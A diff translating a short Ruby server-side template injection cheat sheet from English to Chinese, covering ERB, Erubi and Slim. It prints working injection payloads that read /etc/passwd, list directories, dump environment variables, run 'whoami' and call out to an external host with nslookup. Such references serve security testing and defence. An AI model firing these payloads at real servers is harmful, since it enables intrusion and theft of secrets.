@@ -1,20 +1,22 @@
-# Server Side Template Injection - Ruby
+[原文文档](Ruby.en.md)
 
-> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.
+# 服务器端模板注入 - Ruby
 
-## Summary
+> 服务器端模板注入（SSTI）是一种漏洞，发生在攻击者可以将恶意代码注入服务器端模板中，导致服务器执行任意命令。在Ruby中，当使用模板引擎如ERB（嵌入式Ruby）、Haml、liquid或Slim时，如果用户输入被纳入模板而没有适当的清理或验证，就会出现SSTI。
 
-- [Templating Libraries](#templating-libraries)
+## 概述
+
+- [模板库](#模板库)
 - [Ruby](#ruby)
-    - [Ruby - Basic injections](#ruby---basic-injections)
-    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
-    - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Remote Command execution](#ruby---remote-command-execution)
-- [References](#references)
+    - [Ruby - 基本注入](#ruby---基本注入)
+    - [Ruby - 检索/etc/passwd](#ruby---检索etcpasswd)
+    - [Ruby - 列出文件和目录](#ruby---列出文件和目录)
+    - [Ruby - 远程命令执行](#ruby---远程命令执行)
+- [参考资料](#参考资料)
 
-## Templating Libraries
+## 模板库
 
-| Template Name | Payload Format |
+| 模板名称 | 负载格式 |
 | ------------ | --------- |
 | Erb      | `<%= %>`   |
 | Erubi    | `<%= %>`   |
@@ -26,35 +28,35 @@
 
 ## Ruby
 
-### Ruby - Basic injections
+### Ruby - 基本注入
 
-**ERB**:
+**ERB**：
 
 ```ruby
 <%= 7 * 7 %>
 ```
 
-**Slim**:
+**Slim**：
 
 ```ruby
 #{ 7 * 7 }
 ```
 
-### Ruby - Retrieve /etc/passwd
+### Ruby - 检索/etc/passwd
 
 ```ruby
 <%= File.open('/etc/passwd').read %>
 ```
 
-### Ruby - List files and directories
+### Ruby - 列出文件和目录
 
 ```ruby
 <%= Dir.entries('/') %>
 ```
 
-### Ruby - Remote Command execution
+### Ruby - 远程命令执行
 
-Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
+使用SSTI执行代码，适用于**Erb**、**Erubi**、**Erubis**引擎。
 
 ```ruby
 <%=(`nslookup oastify.com`)%>
@@ -65,12 +67,12 @@ Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
-Execute code using SSTI for **Slim** engine.
+使用SSTI执行代码，适用于**Slim**引擎。
 
 ```powershell
 #{ %x|env| }
 ```
 
-## References
+## 参考资料
 
-- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+- [Ruby ERB模板注入 - Scott White & Geoff Walton - 2017年9月13日](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
